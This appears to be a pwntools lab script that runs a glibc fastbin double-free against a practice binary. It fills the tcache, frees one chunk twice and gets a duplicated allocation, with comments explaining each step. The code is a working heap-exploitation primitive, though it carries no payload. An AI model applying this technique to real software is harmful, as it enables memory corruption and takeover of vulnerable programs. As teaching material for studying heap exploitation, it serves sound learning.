#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    # 7 allocations to fill 0x20 bin in tcache
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0x10")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    # for fastbin chunk 1
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*] ")
    fastbin_alloc1 = int(p.recvline()[:-1], 16)

    # for fastbin chunk 2
    p.clean()
    p.sendline(b"malloc 0x10")
    p.recvuntil(b"[*] ")
    fastbin_alloc2 = int(p.recvline()[:-1], 16)

    # fill 0x20 bin in tcache
    for current in tcache_allocations:
        p.sendline(f"free {current:#x}".encode())

    # free both chunks to fastbin 0x20
    p.sendline(f"free {fastbin_alloc1:#x}".encode())
    p.sendline(f"free {fastbin_alloc2:#x}".encode())
    # at this point fastbin 0x20: fastbin_alloc2 -> fastbin_alloc1

    # fastbin has an arbitrary len per bin, it can not afford
    # to check each entry, so it only check the head for double free
    p.sendline(f"free {fastbin_alloc1:#x}".encode())
    # at this point fastbin 0x20: fastbin_alloc1 -> fastbin_alloc2 -> fastbin_alloc1

    # clear tcache bin 0x20
    for _ in range(7):
        p.sendline(b"malloc 0x10")

    # malloc 3 more times 
    # it will pull available chunks fom fastbin 0x20
    # 1st and 3rd entries will be duplicated
    for i in range(3):
        p.clean()
        p.sendline(b"malloc 0x10")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        print(f"malloc {i+1} from fastbin 0x20 = {ptr:#x}")

    input("done. duplicated allocation achieved from malloc 1 and malloc 3")



def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
